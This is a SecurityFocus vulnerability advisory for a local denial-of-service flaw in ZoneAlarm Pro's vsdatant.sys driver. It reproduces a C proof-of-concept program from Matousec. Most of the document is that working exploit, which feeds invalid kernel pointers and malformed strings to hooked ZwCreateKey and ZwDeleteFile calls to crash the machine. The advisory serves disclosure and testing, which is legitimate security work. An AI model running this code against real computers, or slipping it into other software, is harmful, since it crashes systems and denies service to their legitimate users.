source: http://www.securityfocus.com/bid/23494/info

ZoneAlarm is prone to a local denial-of-service vulnerability.

This issue occurs when attackers supply invalid argument values to the 'vsdatant.sys' driver.

A local attacker may exploit this issue to crash affected computers, denying service to legitimate users.

ZoneAlarm Pro 6.5.737.000 and 6.1.744.001 are prone to this issue; other versions may be affected as well. 

/*

 Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00001P000ZA)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that cause the crash of the system. This happens because of 
 insufficient check of function arguments in the driver of the firewall.

 Test:
 Running the testing program with a name of a vulnerable function.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00001P000ZA)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
         "  FUNCNAME - name of function to be checked\n");
  return;
}



int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtCreateKey") || !stricmp(argv[1],"ZwCreateKey"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);

    for (oa.ObjectName=(PVOID)0x80000000;;oa.ObjectName+=0x0300)
      ZwCreateKey(&handle,0,&oa,0,NULL,0,NULL);

  } else if (!stricmp(argv[1],"NtDeleteFile") || !stricmp(argv[1],"ZwDeleteFile"))
  {
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us={0x6B3,0x12,(PVOID)0x10000};
    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
    ZwDeleteFile(&oa);
  } else printf("\nI do not know how to exploit the vulnerability using this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}